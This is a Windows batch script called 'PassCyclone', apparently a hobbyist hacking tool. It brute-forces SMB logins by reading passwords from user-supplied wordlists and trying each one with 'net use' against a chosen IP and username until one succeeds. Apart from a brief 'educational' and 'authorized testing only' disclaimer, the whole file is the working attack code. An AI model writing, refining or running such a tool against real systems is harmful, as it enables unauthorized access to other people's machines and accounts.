@echo off
title PassCyclone - by OnionGuy93
Color A
:: PassCyclone - Password Bruteforcer
:: Created for educational purposes
:: ----------------------------------
echo ========================================
echo            PassCyclone
echo    The Ultimate Password Cycler
echo ========================================
echo.
echo [*] Initializing PassCyclone...
echo [*] Loading Modules...
echo [*] Preparing Bruteforce Attack Environment...
echo.
echo [+] PassCyclone is ready to unleash the storm!
echo [+] Use responsibly for authorized testing only.
echo ===================================================
pause

:: Prompt for inputs
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List(s) (comma separated for multiple lists): "

:: Parse the wordlist input
for %%w in (%wordlist%) do (
    echo [+] Attacking with wordlist: %%w
    call :process_wordlist %%w
)

echo Password not found :(
pause
exit

:process_wordlist
:: Handle each wordlist provided
set list=%1
set /a count=1

:: Check if the file exists
if not exist %list% (
    echo [-] Wordlist %list% not found!
    goto :eof
)

:: Loop through the wordlist and attempt logins
for /f %%a in (%list%) do (
   set pass=%%a
   call :attempt
)
goto :eof

:attempt
:: Attempt login
echo [ATTEMPT %count%] [%pass%]
net use \\%ip% /user:%user% %pass% >nul 2>&1
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
goto :eof

:success
:: On success
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit
